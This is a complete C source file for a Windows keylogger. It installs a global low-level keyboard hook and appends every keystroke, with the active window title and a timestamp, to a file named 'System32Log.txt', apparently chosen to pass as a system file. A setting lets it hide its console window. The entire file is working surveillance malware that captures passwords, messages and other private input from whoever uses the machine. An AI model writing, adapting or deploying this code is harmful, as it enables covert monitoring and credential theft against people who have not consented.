#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <time.h>
#include <stdio.h>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible 1// (true 1 / false 0)

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

int Save(int key_stroke);
FILE *fp;

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >=0 && wParam == WM_KEYDOWN)
	{
		// lParam is the pointer to a KBDLLHOOKSTRUCT structure
		Save(((PKBDLLHOOKSTRUCT)lParam)->vkCode);
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

int Save(int key_stroke)
{
    static char lastwindow[256];
	static char window_title[256];
	HWND foreground;
	if ((key_stroke == VK_LBUTTON) || (key_stroke == VK_RBUTTON))
		return 0; // ignore mouse clicks
	
	foreground = GetForegroundWindow();
   
    if (foreground) {
		GetWindowTextA(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);
			fprintf(fp, "\n\n[Window: %s - at %s]\n", window_title, s);
		}
    }

	// check caps lock
	char caps = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

	// check shift key
	char shift = ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0);

	if (key_stroke == VK_BACK)
		fputs("[BACKSPACE]", fp);
	else if (key_stroke == VK_RETURN)
		fputs("[RETURE]", fp);
	else if (key_stroke == VK_SPACE)
		fputc(' ', fp);
	//else if (key_stroke == VK_TAB)
	//	OUTPUT_FILE << "[TAB]";
	//else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
	//	OUTPUT_FILE << "[SHIFT]";
	//else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
	//	OUTPUT_FILE << "[CONTROL]";
	//else if (key_stroke == VK_ESCAPE)
	//	OUTPUT_FILE << "[ESCAPE]";
	//else if (key_stroke == VK_END)
	//	OUTPUT_FILE << "[END]";
	//else if (key_stroke == VK_HOME)
	//	OUTPUT_FILE << "[HOME]";
	//else if (key_stroke == VK_LEFT)
	//	OUTPUT_FILE << "[LEFT]";
	//else if (key_stroke == VK_UP)
	//	OUTPUT_FILE << "[UP]";
	//else if (key_stroke == VK_RIGHT)
	//	OUTPUT_FILE << "[RIGHT]";
	//else if (key_stroke == VK_DOWN)
	//	OUTPUT_FILE << "[DOWN]";
	//else if (key_stroke == 20)
	//	OUTPUT_FILE << "[CAPSLOCK]";
	else if (key_stroke == VK_OEM_MINUS)
		fputc(shift ? '_' : '-', fp);
	else if (key_stroke == VK_OEM_PLUS)
		fputc(shift ? '+' : '=', fp); 
	else if (key_stroke == VK_OEM_5)
		fputc(shift ? '|' : '\\', fp); 
	else if (key_stroke == VK_OEM_3)
		fputc(shift ? '~' : '`', fp);
	else if (key_stroke == VK_OEM_4)
		fputc(shift ? '{' : '[', fp);
	else if (key_stroke == VK_OEM_6)
		fputc(shift ? '}' : ']', fp);
	else if (key_stroke == VK_OEM_1)
		fputc(shift ? ':' : ';', fp);
	else if (key_stroke == VK_OEM_7)
		fputc(shift ? '"' : '\'', fp);
	else if (key_stroke == VK_OEM_COMMA)
		fputc(shift ? '<' : ',', fp);
	else if (key_stroke == VK_OEM_PERIOD)
		fputc(shift ? '>' : '.', fp);
	else if (key_stroke == VK_OEM_2)
		fputc(shift ? '?' : '/', fp);
	else if (key_stroke == '0')
		fputc(shift ? ')' : '0', fp);
	else if (key_stroke == '1')
		fputc(shift ? '!' : '1', fp);
	else if (key_stroke == '2')
		fputc(shift ? '@' : '2', fp);
	else if (key_stroke == '3')
		fputc(shift ? '#' : '3', fp);
	else if (key_stroke == '4')
		fputc(shift ? '$' : '4', fp);
	else if (key_stroke == '5')
		fputc(shift ? '%' : '5', fp);
	else if (key_stroke == '6')
		fputc(shift ? '^' : '6', fp);
	else if (key_stroke == '7')
		fputc(shift ? '&' : '7', fp);
	else if (key_stroke == '8')
		fputc(shift ? '*' : '8', fp);
	else if (key_stroke == '9')
		fputc(shift ? '(' : '9', fp);
	else if (key_stroke >= 'A' && key_stroke <= 'Z')
		fputc(caps^shift ? key_stroke : key_stroke + 32, fp);
	//instead of opening and closing file handlers every time, keep file open and flush.
    fflush(fp);
	return 0;
}


int main()
{
	//open output file in append mode
	fp = fopen("System32Log.txt","a");

	// visibility of window
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), visible); // visible window

	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBoxA(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
	
	//release resource
	//UnhookWindowsHookEx(_hook);
}